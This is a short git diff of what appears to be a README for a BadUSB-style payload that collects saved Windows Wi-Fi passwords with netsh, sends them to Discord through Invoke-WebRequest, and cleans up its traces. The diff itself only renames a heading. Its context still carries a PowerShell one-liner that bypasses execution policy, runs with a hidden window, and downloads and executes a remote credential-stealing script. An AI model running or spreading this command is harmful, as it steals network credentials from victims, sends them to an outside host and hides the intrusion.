@@ -33,7 +33,7 @@ Then it cleans up traces of what you have done after.
 * Invoke 2 netsh commands
 * Invoke-WebRequest will be entered in the Run Box to send the content to Discord
 
-All
+Execution
 ```powershell
 powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "iex (iwr -uri 'https://raw.githubusercontent.com/Zenin0/Glipper_Scripts/main/Windows/Credentials/WWifiPasswords/W-Wifi-Passwords.ps1').Content"
 ```
